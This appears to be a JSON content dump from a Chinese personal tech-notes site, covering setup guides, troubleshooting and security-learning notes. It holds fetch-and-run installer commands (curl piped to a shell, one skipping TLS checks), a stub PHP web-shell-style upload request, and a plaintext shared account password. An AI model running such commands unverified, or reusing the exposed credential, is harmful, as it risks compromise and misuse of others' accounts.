文件，直接修改密码，无需知道旧密码。\n或是通过 Neo4j Desktop 的 Reset DBMS password 功能进行重置。\n\nDocker 容器初始化密码\n若是通过 Docker 进行部署，可通过设置环境变量 NEO4J_AUTH=neo4j/neo4j 来设置账号密码。\ndocker run -d --env NEO4J_AUTH=neo4j/neo4j -it neo4j:3.5.13"},"articles/tech/web/Prettier-格式化":{"title":"Prettier 格式化","links":[],"tags":[],"content":"全局安装 prettier 工具\nnpm install --global prettier\n定义配置文件 .prettierrc.json『支持多种格式』，例如\n{\n  &quot;printWidth&quot;: 120,\n  &quot;tabWidth&quot;: 4,\n  &quot;useTabs&quot;: false,\n  &quot;singleQuote&quot;: false,\n  &quot;semi&quot;: true,\n  &quot;endOfLine&quot;: &quot;lf&quot;,\n  &quot;bracketSpacing&quot;: true,\n  &quot;arrowParens&quot;: &quot;always&quot;\n}\n之后执行如下命令，格式化所需文件，下面的命令表示，格式化 src 目录下所有后缀为 ts 的文件。\nprettier --config .prettierrc.json --write ./src/*.ts"},"articles/学习方式":{"title":"学习方式","links":[],"tags":[],"content":"TK 在近期的 微博 上提到了他在 16 年分享的一篇微博，微博的内容是他在腾讯玄武实验室的一次分享，介绍个人成长的。\n虽然研究的方向不同，但是分享的内容中有部分东西是可以借鉴的。\n\n确立个人方向，结合工作内容，找出对应短板\n\n该领域主要专家的工作十分都了解？\n相关网络协议，文件格式是否熟悉？\n相关的技术和主要工具是否看过、用过？\n\n\n\n个人的研究方向，这个有点坎坷，最开始我没有具体的方向，觉得什么好玩，就玩什么，攻防，逆向，Web 和 Java 安全。这样的缺点很明显，了解到多，但不精通。而且稍微不碰，就容易忘记。\n后面决定专心做 Java 安全和代码分析，不是长期的，但想着坚持研究学习下去。\n处于工作原因，我并不是专职的安全研究人员，大多时间是处理业务，而无过多时间进行安全研究的。\n就上面这 3 个问题，我可能只能回答，不了解，算不上熟悉（不敢保证脱口而出那种），看过，用过部分。这部分该反思了，就像在实验室的研究一样，你需要了解这个领域的现状，多关注 Top 任务的研究内容，多读多实践。\n\n阅读只是学习的起点\n\n工具的参数，要看，要试，如果能阅读代码实现就更好了\n学习网络协议要实际抓包分析，学习文件格式要读代码实现\n学习老漏洞，要调试，搞懂他人 EXP 或 Poc 的含义，并自己重写\n细节、细节、再细节，刨根问底\n\n\n\n接触最多的工具，都是 Java 利用相关的，比如放序列化，JNDI等，但各类工具等代码和使用没有仔细研究过。Web 下最重要的协议当属 HTTP 了，各类细节需要牢记与心。\n学习参考目标的建设\n\n短期参考什么？比自己优秀的同龄人\n\n阅读他人文章和工作成果，从细节中观察他们的学习方式和工作方式\n\n\n中期参考什么？研究方向上的业内专家\n\n了解他们的成长轨迹，跟踪他们关注的内容\n\n\n长期参考什么？业内老牌企业和先锋企业\n\n把握行业发展、技术趋势，为未来做积累\n\n\n\n推荐的学习方式\n\n以工具为线索\n\n如，Metasploit\n\n遍历每个子目录，除了 Exploit 里面还有什么？\n每个工具分别有什么功能？原理是什么？涉及哪些知识？\n能否改进优化？能否发展、组合出新的功能？\n\n\n\n\n以专家为线索\n\n你的技术方向有哪些专家？\n他们的邮箱、主页、社交账号有哪些？\n他们在该方向上有哪些作品？发布过哪些演讲？\n跟踪关注，一个一个学\n\n\n\n以上两点，需要花时间，稍稍整理关注的专家或相关领域的研究人员，收集整理他们的信息，文章，账号。持续关注维护，并坚持学习。之前只是十分零散的了解关注了一些，然后他们就在我的收藏夹里吃灰了。\n\n处理好学习、工作和生活，这三者上矛盾统一的，毕竟一天只有 24 小时\n\n这大概是一生的难题了。\n如何提高效率\n\n做好预研，收集相关前人成果，避免无谓的重复劳动\n在可行性判断阶段，能找到工具就不写代码，能用脚本语言就不要用编译型语言，把完美主义放到最终的实现阶段\n做好笔记并定期整理，遗忘会让所有的投入都白白浪费\n多和同时交流，别人说一个工具的名字可能让你节约数个小时！\n咖啡可以提高效率，而且合法\n无论怎么提高效率，要成为专家，都需要大量的时间投入\n\n我需要改进的地方，少做重复劳动，在尝试某个东西的时候，总爱自己造轮子。笔记虽有记录，但少有回顾整理。交流更是最重要的了，工作环境的原因，周围没什么人能够让我去交流的，这是实话，需要从外部探索。咖啡？获取可以尝试一下，不过我也喝茶的，不知道差别大不大，哈哈哈。"},"cavans/拉里事迹":{"title":"拉里事迹","links":[],"tags":[],"content":"年少时偷跑到加拿大参加空军，结识好友帕特西，后好友为救拉里战死，对拉里的心灵造成很大震撼，从此开启自我心灵上的救赎之路。\n归国后拒绝了马图林先生推荐的工作。\n与伊莎贝尔约定前往巴黎两年，在巴黎的第二年初秋他与作者再次相遇。\n此后伊莎贝尔与母亲一同前往过巴黎一次，她们，艾略特以及拉里相处了一段时间。四人参加了艾略特组织的聚会，\n前往法国北部，与比利时挨着的小镇上当矿工，认识了考斯第。\n数月后，带着考斯第一起流浪，前往德国。"},"cheat-sheets/Website":{"title":"Website","links":[],"tags":["website"],"content":"网络安全\n\nCoco413 整理维护的网络安全咨询汇集平台\nwww.opencve.io/cve 「搜索 CVE」\nvulners.com/ 『漏洞库，支持 RSS 订阅』\n\n会议\n\nFOSDEM 2023 - Home\n\n漏洞挖掘/赏金\n\n开源软件的漏洞挖掘平台 huntr.dev/\n\n开源软件查找\n\nOpen Source Libs - Best Open Source Software Projects\n\n书籍\n\n中文\n\n数字图书馆。搜索书籍。免费下载书籍 (ca1lib.org)，（已死，使用下面内容替代）\nzlib.cydiar.com ，作者使用 github.com/tw93/Pake 将网页打包成了应用，可以下载使用。\nsinglelogin.me/ 可使用在 ca1lib.org 中注册的账号进行登录\nannas-archive.org/\n\n\n英文\n\nLibrary Genesis (libgen.is)\nz-lib.is/\n\n\n\n编程工具\n\nGit Commit 信息编写指南 Conventional Commits\n在线调试器\n\nOnline Java Debugger - online editor (onlinegdb.com)\n\n\nJDK 文档\n\nDocJar: Search Open Source Java API\n\n\n云开发平台\n\nWorkspaces — Gitpod\n\n\n云发布平台\n\nRender Dashboard\n\n\n重新整理后的 Linux Man 文档\n\ndashdash.io/\n\n\nAI 开发\n\nSteamship\n\n\nCS 学习\n\nCS自学指南\n\n\n前端开发\n\n在线编程\n\nTrending - CodePen\n\n\n\n\n\n绘图\n\nDrawio\nMiro | Online Whiteboard for Visual Collaboration\n\n工具软件\n\nGTFOBins, list of Unix binaries that can be used to bypass local security restrictions\nTable Convert Online - Make it easier to work with tables\n\n数据库学习指南\n\ndatabase.guide/\n\n杂项\n\n通过地图和时间线直观地学习历史\n\nOracle 公共账号密码\n\n账户： 3028064308@qq.com\n密码：OraclePassword123!\n\nOpenAI 注册\n\nOpenAI 保姆级注册教程 | LetsVPN Help Center (intercom.help)\nprompt 网站\n\n机场\n\ncp.dawangidc.com/clientarea.php\n\nAI 工具\n\nCall Annie ：手机号注册，拨通后可与 AI 进行语音交流，或练习口语。\nDamnGood.Tools：一系列基于 GPT 的工具，可以和 PDF 对话，目前好像不支持中文 PDF 文件，但是支持用中文提问和回答\nScholarTurbo - Use ChatGPT to chat with PDFs (supports GPT-4)*：上传 PDF 并进行对话，免费账户仅支持 GPT3.5 模型。\nPandaGPT, file reading made easy：国内推出的基于 GPT 和 LangChain 的工具，上传文件并进行对话。\nSpeak &amp; Improve：剑桥大学开发的用于提升英语口语的 AI，免费使用。\n"},"inbox/Linux---resolv.conf":{"title":"Linux - resolv.conf","links":[],"tags":["linux","dns","resolv"],"content":"/etc/resolv.conf 配置文件介绍。\n可通过该文件可配置 DNS 相关内容，例如指定 DNS 服务器地址，查询策略等。\nNameserver\n可通过 nameserver 指定 DNS 查询服务器\ncat /etc/resolv.conf\nnameserver 8.8.4.4\n可同时指定多个\ncat /etc/resolv.conf\nnameserver 8.8.4.4\nnameserver 1.1.1.1\nnameserver 8.8.8.8\nSearch\nsearch 可指定 DNS 的查询策略，当查询一个域名时，会与 search 中的域名组成 FQDN『全限定域名』之后再查询\ncat /etc/resolv.conf \nsearch departmentA.org departmentB.org\nnameserver 8.8.8.8\n例如，对于上面的配置，假设要查询 node1，则会将 node1 与 departmentA.org 组合成 node1.departmentA.org 再使用 8.8.8.8 进行查询。如果失败，则尝试与 departmentB.org 进行组合。\n而对于要查询的域名 node1.com，则会先直接查询 node1.com，如果失败再尝试与 search 列表中的域名组合成 FQDN 进行查询。域名的第一次查询是否需要和 search 中的域名进行组合在查询，取决于配置项 ndots『默认为 1』，所有的域名都至少有一个 .『只是大家通常忽略』。\nSortlist\nsortlist 用于从 DNS 查询结果中过滤所需的 IP 地址，例如如果一个域名的查询结果返回了多个 IP，最符合 sortlist 中的 IP 会被使用。\ncat /etc/resolv.conf\nnameserver 8.8.4.4\nsortlist 34.101.0.0/255.255.0.0\nOptions\nNdots\nndots 选项决定了第一次查询某个域名时，是否与 search 列表进行组合，默认值为 1。ndots 表示一个域名最小的 . 的数量，如果超过了这个值，则作为绝对域名进行第一查询。\ncat /etc/resolv.conf\nnameserver 8.8.8.8\noptions ndots:3\n参考\n\nwww.baeldung.com/linux/etc-resolv-conf-file 『The /etc/resolv.conf File』\n"},"index":{"title":"Trganda's Site","links":["README","tags"],"tags":[],"content":"基于 Quartz 搭建的个人知识库平台。有关我是如何发布 Obsidian 中的文章至 Github Page 的可见 README。\nContent\n可在 Tags 查看所有内容，完整的目录结构如下："},"projects/Web-漏洞解析与攻防实战/HTTP-协议与编码":{"title":"HTTP 协议与编码","links":[],"tags":[],"content":"GET 参数\n\n一般形式\n\nkey = value\n\n\n数组形式\n\nkey[name] = value\n\n\n\n编码\n请求体中传输的内容，有多种形式，如传输文件一般使用 multipart/form-data，或数据量较大时『如：视频传输』采用 chunked 形式进行传输。\nchunked\n常见请求报文形式\nPOST /sqli.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n \n1a\na=To be or not to be, that\ne\nis a question.\n0\n通过 Transfer-Encoding 指定 chunked 模式，请求体中 1a 表示长度声明，为十进制的 26。其后下一行的内容 a=To be or not to be, that 为传输的数据。后面的内容依旧是 长度 + 内容 的形式。\n当长度为 0 表示传输结束，其后跟两个 \\r\\n。\nmultipart\n通过 Content-Type 指定请求头格式，字段值的形式为\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary{随机字符串}\n\n之后的内容以 ------WebKitFormBoundary{随机字符串} 作为开始和分割线，注意前面多了两个 --，以 ------WebKitFormBoundary{随机字符串}-- 作为结束。\n进行文件传输时，在分割的请求体内容中，为传输的文件数据，以及其它参数。\n------WebKitFormBoundary{随机字符串}\nContent-Disposition: form-data; name=&quot;test&quot;; filename=&quot;a.php&quot;\nContent-Type: application/octet-stream\n\n&lt;?php $_GET[&#039;a&#039;];?&gt;\n------WebKitFormBoundary{随机字符串}\nContent-Disposition: form-data; name=&quot;filename&quot;;\n\nindex.php\n------WebKitFormBoundary{随机字符串}--\n\nContent-Disposition 后的 form-data; 默认存在，也可以省略。\n其它编码\n\nASCII 编码\nURL 编码\nGBK 编码\nUnicode 编码\nBase64 编码\n\nBase64 编码相比 URL 编码，编码后的信息压缩比更小，为 8/6，也就是用 8 bit 来表示 6 bit 的信息。Base64 编码通常采用 26 个大小写英文字母，数字 0-9、+、/、以及填充字符 =，共计 65 个字符。\n由于 Base64 编码中包含 +，/，在 HTTP 请求中可能造成歧义，所以大部分 Web 服务器，默认只对请求内容进行 URL 解码。\nBase64 的编码规则如下：\n\n每 6 bit 按照 64 进制转换为对应的字符\n如果最后不足 6 bit，存在两种情况\n\n剩余 2 bit，则填充 4 bit，用这 6 bit 转换为对应的字符，并在结尾填入两个填充字符 =\n剩余 4 bit，则填充 2 bit，用这 6 bit 转换为对应的字符，并在结尾填入一个填充字符 =\n\n\n"},"til/installation/Arch-Linux-Installtation":{"title":"Arch Linux Installtation","links":[],"tags":["arch","installation"],"content":"Pre-Request\nDownload the iso file of archlinux from offical site.\nAnd boot it from your (virtual) machine.\nPreparation\nTips: If you are installing arch on a virtual machine, after arch connect to network, you can change the password or live system by\npasswd\nand use ssh to remote control the installation.\nConnect to Network\nIf you install archlinux from virtual machine, the connection should be automatic connected.\nTo set up a network connection in the live enviroment, go through the following steps:\nUpdate The Systeml Clock\nUse timedatectl to ensure the system clock is accurate\ntimedatectl set-ntp true\nPartition The Disks\nYou can use lsblk or fdisk tool to modified your block device, it’s recommand to use fdisk, run\nfdisk -l\nto inspire your devices.\nTypically, you can partition your disks like below with GPT\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nMount pointPartitionPartition typeSuggested size/mnt/boot1/dev/efi_system_partitionEFI system partitionAt least 300 MiB[SWAP]/dev/swap_partitionLinux swapMore than 512 MiB/mnt/dev/root_partitionLinux x86-64 root (/)Remainder of the device\nSo, you can run the command below (suppose your disk device is /dev/sda),\nfdisk /dev/sda\nto entire the interactive model and\n\ncreate a GPT\ncreate a partition /dev/sda1 with type efi system\ncreate a swap partition /dev/sda2\ncreate a main partition /dev/sda3 for mount root path\n\nFormat The Partitions\nFor efi system partition, format with\nmkfs.fat -F 32 /dev/sda1\n\n:warning: Only format the EFI system partition if you created it during the partitioning step. If there already was an EFI system partition on disk beforehand, reformatting it can destroy the boot loaders of other installed operating systems.\n\nInitialize the swap space\nmkswap /dev/sda2\nand format the /dev/sda3 to a normal Ext4 filesystem.\nmkfs.ext4 /dev/sda3\nMount the File Systems\nCreate a folder named boot.\nmkdir -p /mnt/boot\nMount the root volume to /mnt.\nmount /dev/sda3 /mnt\nMount the EFI system partition\nmount /dev/sda1 /mnt/boot\nEnable swap space with swapon(8):\nswapon /dev/sda2\nFor the next step, genfstab(8) will detect mounted file systems and swap space.\nInstallation\nBefore the installation, it’s recommand to chose the best mirror for you region. On the live system, after connecting to the internet, reflector updates the mirror list by choosing 20 most recently synchronized HTTPS mirrors and sorting them by download rate. Or, you can run\nreflector -c {Your Country} -a 10 --sort rate --save /etc/pacman.d/mirrorlist\nInstall Essential Packages\nUse the pacstrap(8) script to install the base package, Linux kernel and firmware for common hardware\npacstrap /mnt base linux linux-firmware vim sudo\n\nTips: You can substitute linux for a kernel package of your choice.\nYou could omit the installation of the firmware package when installing in a virtual machine or container.\n\nConfigure The System\nFstab\nGenerate a fstab file (use -U or -L to define by UUID or labels, respectively):\ngenfstab -U /mnt &gt;&gt; /mnt/etc/fstab\nCheck the resulting /mnt/etc/fstab file, and edit it in case of errors.\nChroot\nChange root into the new system:\narch-chroot /mnt\nTime Zone\nSet the time zone\nln -sf /usr/share/zoneinfo/Region/City /etc/localtime\nand run hwclock(8) to generate /etc/adjtime\nhwclock --systohc\nThis command assumes the hardware clock is set to UTC. See System time standard for details.\nLocalization\nEdit /etc/locale.gen and uncomment en_US.UTF-8 UTF-8 and other needed locales. Generate the locales by running:\nlocale-gen\nCreate the locale.conf(5) (by touch /etc/locale.conf) file, and set the LANG variable (include the other needed locales you enabled with locale-gen) accordingly:\n# /etc/locale.conf\nLANG=en_US.UTF-8\n\nNetwork Configuration\nIt’s recomand to installl NetworkManager package for manager you network,\npacman -S networkmanager\nYou can create a connection with nmtui tool provided by networkmanager package and enable the service startup with\nsystemctl enable NetworkManager\nSet Root Password\nSet the [passwod](Root password) of root\npasswd\nAnd create a not-root user\nuseradd -m -g users -s /bin/bash {user_name}\nand set the password for this user\npasswd {user_name}\nAdd the privilege for use sudo command\nvim /etc/sudoers\n# add the following line after root ALL=(ALL) ALL\n# {user_name} ALL=(ALL) ALL\n\nTips: Make sure you have installed the sudo package.\n\nInstall Boot Loader\nChoose and install a Linux-capable boot loader. I have use Grub here, install the package first\npacman -S dosfstools grub efibootmgr\nAnd run\ngrub-install --target=x86_64-efi --efi-directory=/boot --recheck\nGenerate the configuration file\ngrub-mkconfig -o /boot/grub/grub.cfg\nReboot\nExit the chroot environment by typing exit or pressing Ctrl+d.\nOptionally manually unmount all the partitions with umount -R /mnt, this allows noticing any “busy” partitions, and finding the cause with fuser(1).\nFinally, restart the machine by typing reboot, any partitions still mounted will be automatically unmounted by systemd. Remember to remove the installation medium and then login into the new system with the root account.aura\nNow, you can reboot your system, and start using your arch linux :grinning:.\nPost Installation\nYay\nyay support downloading packages from the Arch User Repository (AUR), which is a community-maintained repository providing thousands of third-party packages in the form of installation scripts, also known as PKGBUILDs.\nTo install yay on your Arch desktop, first, download the following dependencies:\nsudo pacman -S --needed base-devel git\nThen, clone the yay repository using the git clone command:\ngit clone aur.archlinux.org/yay.git\nChange your present working directory to the newly-downloaded yay folder using the cd command:\ncd yay\nFinally, use the makepkg command to build and install yay:\nmakepkg -si\nReference\n\nwiki.archlinux.org/title/Installation_guide\n"},"til/installation/Arm-系列的-Mac-上安装-Arch--Parallels-虚拟机":{"title":"Arm 系列的 Mac 上安装 Arch  Parallels 虚拟机","links":[],"tags":["arm","installation"],"content":"Arch 的社区提供了开箱即用的 Parallels 虚拟机，可从 Index of /~tpowa/parallels/ 下载，解压后用 Parallels 打开即可。默认用户名和密码为\nuser: root\npasswd: 123\n"},"til/installation/M1-Mac-搭建-SQL-Server":{"title":"M1 Mac 搭建 SQL Server","links":[],"tags":["mssql","installation"],"content":"在 Arm 系列的 Mac 中，使用虚拟机（Windows 11 Arm）安装 SQL Server 会失败。原因可能是 SQL Server 目前还不支持在 Arm 架构上运行。\nAzure SQL Edge 的数据库引擎与 SQL Server 兼容，它由 SQL Server 的数据库引擎优化更新而来，主要面对 IOT 场景。可以使用 Azure SQL Edge 来代替 SQL Server。\n安装步骤如下：\n\n安装 Docker。\n拉取 [Azure SQL Edge](Docker Hub) 镜像。\n\ndocker pull mcr.microsoft.com/azure-sql-edge\n\n运行该镜像，注意替换密码。默认运行 Develop 版本，运行 Premium 版本可使用环境变量 -e &#039;MSSQL_PID=Premium&#039;。\n\ndocker run --cap-add SYS_PTRACE -e &#039;ACCEPT_EULA=1&#039; -e &#039;MSSQL_SA_PASSWORD=Pass@word123&#039; -p 1433:1433 --name sqledge -d mcr.microsoft.com/azure-sql-edge\n\n使用 Azure Data Studio 连接 Azure SQL Edge 数据库。\n\nSupported Features in SQL Edge ⚠️\nAzure SQL Edge 支持的 TSQL 特性只是 SQL Server 2019 on Linux 的子集，意外着某些功能无法在 Azure SQL Edge 中使用，例如 [DATE_BUCKET()](database.guide/about-the-date_bucket-function-in-azure-sql-edge/) 函数。\n更多差异见 Supported features of Azure SQL Edge on the Microsoft 。"},"til/installation/Neo4j-Desktop-下载":{"title":"Neo4j Desktop 下载","links":[],"tags":[],"content":"可直接使用如下链接访问下载页面，只需修改对应参数『flavour=osx&amp;release=1.5.8』即可\n\nMac 下需要使用 safari 浏览器，前端 JS 会检查 Agent。\n\n\nneo4j.com/download-thanks-desktop/\n"},"til/installation/Neo4j-安装":{"title":"Neo4j 安装","links":["til/installation/Neo4j-Desktop-下载"],"tags":["neo4j"],"content":"首先下载 Neo4j Desktop，见 Neo4j Desktop 下载。\n在 Neo4j Desktop 的 Project 中创建一个新的本地数据库，选择所需版本并填入密码『默认账号名为 neo4j』即可。\n\n创建完成后，可通过内置的 Neo4j Browser 访问，或通过浏览器访问 http://localhost:7474/browser/，输入账号密码登陆。"},"til/installation/安装-Komodor-管理-Kubernetes-集群":{"title":"安装 Komodor 管理 Kubernetes 集群","links":[],"tags":[],"content":"\n参考 docs.komodor.com/Learn/Install-Komodor-Agent.html#step-3-integrate-additional-clusters 住 Kubernetes 集群中安装 Komodor Agent。\n\n没有使用官方的 安装脚本，选择通过 helm 进行安装。根据文档，在执行如下命令前，需要先安装 Helm3。如果使用的是 kubespray 安装的集群，可在 addon.yml 中设置\nhelm_enabled: true\n\n并执行 cluster.yaml 剧本。\n启用 Helm 后，执行如下命令；如果 kubeconfig 文件的位置不处于默认位置，可通过环境变量 KUBECONFIG 进行指定。\nexport KUBECONFIG=/root/.kube/config\nhelm repo add komodorio helm-charts.komodor.io; helm repo update; helm upgrade --install k8s-watcher komodorio/k8s-watcher --set apiKey=&lt;your keys&gt; --set watcher.clusterName=&lt;cluster name&gt;  --wait --timeout=90s &amp;&amp; open app.komodor.com/main/services\n"},"til/installation/镜像整理":{"title":"镜像整理","links":[],"tags":["mirrors","installation"],"content":"Cargo\n推荐使用 HTTP 协议镜像，编辑 ~/.cargo/config 文件，添加以下内容：\n[source.crates-io]\nreplace-with = &#039;mirror&#039;\n\n[source.mirror]\nregistry = &quot;sparse+mirrors.tuna.tsinghua.edu.cn/crates.io-index/&quot;\n\n注：sparse+ 表示在使用稀疏索引，链接末尾的 / 不能缺少。\n截至目前，可以通过 cargo +nightly -Z sparse-registry update 使用稀疏索引。\n\ncargo 1.68 版本开始支持稀疏索引：不再需要完整克隆 crates.io-index 仓库，可以加快获取包的速度。如果您的 cargo 版本大于等于 1.68，可以直接使用而不需要开启 nightly。\n\nNPM\n使用阿里的镜像源 npmmirror，执行以下命令即可：\nnpm config set registry registry.npmmirror.com\n如果想恢复默认源，执行\nnpm config set registry registry.npmjs.org/\nRuby\n使用 rbenv 来安装管理 ruby 环境。\n先安装 rbenv\nbrew install rbenv ruby-build\n为 rbenv 配置镜像，使用 rbenv-china-mirror 插件，此插件会在下载安装 ruby 时替换下载地址为 ruby 国内的官方地址，下载完成后再恢复。\ngit clone github.com/andorchen/rbenv-china-mirror.git &quot;$(rbenv root)&quot;/plugins/rbenv-china-mirror\nMaven\nmirrors.163.com/maven/repository/maven-central\nrepo.exist.com/maven2\nmirrors.ibiblio.org/pub/mirrors/maven2\nwww.ibiblio.net/pub/packages/maven2\nuk.maven.org/maven2\n\n[Fetching Title#9w91](repo.maven.apache.org/maven2/org/apache/logging/log4j/log4j-api/2.0/log4j-api-2.0-sources.jar)\n\n\nrepo.maven.apache.org/maven2/.meta/repository-metadata.xml\n"},"til/installation/长亭雷池安装":{"title":"长亭雷池","links":["til/installation/搭建-Gitea-并备份-Obsidain"],"tags":[],"content":"计划安装长亭雷池社区版本，部署在其它 web 服务之前。\n安装\n安装方式很简单，这里直接使用安装脚本\nbash -c &quot;$(curl -fsSLk waf-ce.chaitin.cn/release/latest/setup.sh)&quot;\n安装位置为\n/opt/safeline\n\n可修改 /opt/safeline/.env 文件的来更改端口，默认监听中 9443，使用 https\nMGT_PORT=9443\n\n修改端口至 2053 的目的是为了使用 cloudflare 的代理服务，2053 属于支持的 https 端口范畴。否则直接访问的话，会报 https 证书不安全，目前还不知道如何为雷池配置证书。\n修改其它容器的配置\n重新修改了 gitea 的配置，相比 搭建 Gitea 并备份 Obsidain 增加 nginx 作为反向代理，仅绑定至 127.0.0.1:80，同时在 nginx.conf 配置文件中设置白名单只允许本地 ip 访问 gitea 服务。\n这样做的目的是避免能够从外部直接访问到服务，否则雷池就白装了。\nversion: &quot;3&quot;\n \nnetworks:\n  gitea:\n    external: false\n \nservices:\n  nginx:\n    image: nginx\n    volumes:\n      - ./nginx.conf:/etc/nginx/conf.d/default.conf\n      - ./key.pem:/root/ssl/key.pem\n      - ./cert.pem:/root/ssl/cert.pem\n    ports:\n      - &quot;127.0.0.1:80:80&quot;\n    depends_on:\n      - gitea\n    networks:\n      - gitea\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    environment:\n      - USER_UID=1000\n      - USER_GID=1000\n      - GITEA__database__DB_TYPE=postgres\n      - GITEA__database__HOST=db:5432\n      - GITEA__database__NAME=gitea\n      - GITEA__database__USER=gitea\n      - GITEA__database__PASSWD=gitea\n      # - GITEA__server__DOMAIN=tea.trganda.top\n      # - GITEA__server__PROTOCOL=http\n      # - GITEA__server__HTTP_PORT=443\n      # - GITEA__server__LOCAL_ROOT_URL=https://localhost:443\n      # - GITEA__server__ENABLE_ACME=true\n      # - GITEA__server__ACME_DIRECTORY=https\n      # - GITEA__server__ACME_ACCEPTTOS=true\n      # - GITEA__server__SSH_DOMAIN=tea.trganda.top\n      - GITEA__server__REDIRECT_OTHER_PORT=false\n      # - GITEA__server__PORT_TO_REDIRECT=80\n      # Close Registration\n      - DISABLE_REGISTRATION=true\n    restart: always\n    networks:\n      - gitea\n    volumes:\n      - ./gitea:/data\n      - ./tea.trganda.top.cert:/data/gitea/tea.trganda.top.cert\n      - ./tea.trganda.top.key:/data/gitea/tea.trganda.top.key\n      - /etc/timezone:/etc/timezone:ro\n      - /etc/localtime:/etc/localtime:ro\n    # ports:\n      # - &quot;127.0.0.1:443:443&quot;\n      # 如果开启gitea的acme功能，则开放该端口用于获取证书时的验证。\n      # - &quot;127.0.0.1:80:80&quot;\n      # - &quot;222:22&quot;\n    depends_on:\n      - db\n \n  db:\n    image: postgres:14\n    restart: always\n    environment:\n      - POSTGRES_USER=gitea\n      - POSTGRES_PASSWORD=gitea\n      - POSTGRES_DB=gitea\n    networks:\n      - gitea\n    volumes:\n      - ./postgres:/var/lib/postgresql/data\n配置\n在防护站点中配置希望被防护的网站\n\n以前是直接将域名 tea.trganda.top 指向 gitea 服务的，现在让它指向雷池防火墙\n在编辑站点中设置对外的域名和端口\n\n可以选择上传对应域名的证书，这里透露就直接自动生成了，另外再设置上游服务器，也就是真正的服务。\n\n参考\n\nwaf-ce.chaitin.cn/docs/guide/install 『在线安装』\nwaf-ce.chaitin.cn/docs/faq/config 『站点配置』\n"},"til/issues/Arch---Signature-is-unknown-trust":{"title":"Arch - Signature is unknown trust","links":[],"tags":["arch","pacman","key"],"content":"# 删除旧的签名密钥\nrm -R /etc/pacman.d/gnupg\n# 初始化密钥数据库文件\npacman-key --init\n# 获取密钥数据\npacman-key --populate archlinux\n安装 archlinuxcn 中的包出现类似如下报错，需要更新导入 archlinuxcn-keyring\nsignature from &quot;lilac (build machine) &lt;lilac@build.archlinuxcn.org&gt;&quot; is unknown trust\nsudo pacman -Sy &amp;&amp; sudo pacman -S archlinuxcn-keyring\n参考\n\nbbs.archlinux.org/viewtopic.php\ngithub.com/archlinuxcn/repo/issues/26\n"},"til/issues/Cargo-SSL-connect-error":{"title":"Cargo SSL connect error","links":[],"tags":["cargo","issues"],"content":"Cargo 安装其它包时出现以下错误信息\nUpdating crates.io index\nwarning: spurious network error (2 tries remaining): [35] SSL connect error (LibreSSL SSL_connect: SSL_ERROR_SSL in connection to crates.io:443 )\nwarning: spurious network error (1 tries remaining): [35] SSL connect error (LibreSSL SSL_connect: SSL_ERROR_SSL in connection to crates.io:443 )\nerror: failed to download from `crates.io/api/v1/crates/cross/0.2.0/download`\n\nCaused by:\n  [35] SSL connect error (LibreSSL SSL_connect: SSL_ERROR_SSL in connection to crates.io:443 )\n\n参考 cargo install fails with SSL_ERROR_SSL in connection to crates.io · Issue #8339 · rust-lang/cargo · GitHub 中 dporru 的回答尝试进行修复，是可以解决的『但问题产生的根本原因不清楚』。\n具体步骤如下：\n删除已安装的 Rust,\nrustup self uninstall\n// or\nbrew uninstall rust\n之后重新安装 LibreSSL\n% brew install libressl\n% echo &#039;export PATH=&quot;/usr/local/opt/libressl/bin:$PATH&quot;&#039; &gt;&gt; $HOME/.zshrc\n% echo &#039;export LDFLAGS=&quot;-L/usr/local/opt/libressl/lib&quot;&#039; &gt;&gt; $HOME/.zshrc\n% echo &#039;export CPPFLAGS=&quot;-I/usr/local/opt/libressl/include&quot;&#039; &gt;&gt; $HOME/.zshrc\n如果是 Arm 系列的 Mac，使用下面的环境变量\n% echo &#039;export PATH=&quot;/opt/homebrew/opt/libressl/bin:$PATH&quot;&#039; &gt;&gt; $HOME/.zshrc\n% echo &#039;export LDFLAGS=&quot;-L/opt/homebrew/opt/libressl/lib&quot;&#039; &gt;&gt; $HOME/.zshrc\n% echo &#039;export CPPFLAGS=&quot;-I/opt/homebrew/opt/libressl/include&quot;&#039; &gt;&gt; $HOME/.zshrc\n关闭当前终端会话并重新打开一，再安装 Rust『安装完成后可将环境变量删除』。\ncurl --proto &#039;=https&#039; --tlsv1.2 -sSf sh.rustup.rs | sh"},"til/issues/Docker-no-space-left-on-device":{"title":"Docker no space left on device","links":[],"tags":["docker","issues"],"content":"构建漏洞环境的时候遇到此问题，Docker 报错\ndocker: write /var/lib/docker/tmp/GetImageBlock***: no space left on device\n看意思，是分配给 Docker 的某些空间不足，在 Docker论坛 上找到此问题。\n缓解方式有两种：\n\n删除不需要的 Docker 镜像 docker system prune --help。\n对空间进行扩容。\n\n第一种方式，执行如下命令会出现提示，删除不需要的内容即可。\ndocker system prune\n \nARNING! This will remove:\n  - all stopped containers\n  - all networks not used by at least one container\n  - all dangling images\n  - all dangling build cache\n第二种方式，扩容\n试了配置文档中的方式，在 daemon.json（Mac 下位于 ~/.docker/daemon.json）文件中，增加如下内容。\n&quot;storage-opts&quot; : [\n  &quot;dm.basesize=20G&quot;\n]\n不过，此方法仅支持 devicemapper storage driver，在 Mac 上无法工作，见 github.com/docker/for-mac/issues/2134#issuecomment-334800706 。\n/Users/trganda/Library/Containers/com.docker.docker/Data/vms/0/data\n\nMac 下可通过 Docker Desktop 进行扩容\nDocker -&gt; settings -&gt; Resources -&gt; Virtual Disk Limit\n\n\n参考\n\nChange preferences on Mac | Docker Documentation\nFrequently asked questions for Mac | Docker Documentation\nDocker no space left on device - General Discussions - Docker Community Forums\nDocker Tips-赵化冰的博客 | Zhaohuabing Blog\nDocker filling up storage on macOS - Stack Overflow\n"},"til/issues/Github---Actions-定时任务":{"title":"Github - Actions 定时任务","links":["articles/tech/Cron-语法"],"tags":["github-action","issues"],"content":"github action 支持多种方式触发 action 的执行，其中包括定时执行 schedule。该方法使用 POSIX cron syntax\n下面的例子设置在每天的 5:30 和 17:30 『UTC』 触发 action workflows，有关 cron 的语法可参考 Cron 语法\non:\n  schedule:\n    # * is a special character in YAML so you have to quote this string\n    - cron:  &#039;30 5,17 * * *&#039;"},"til/issues/LaunchPad-删除无效图标":{"title":"LaunchPad 删除无效图标","links":[],"tags":["mac","issues"],"content":"Mac 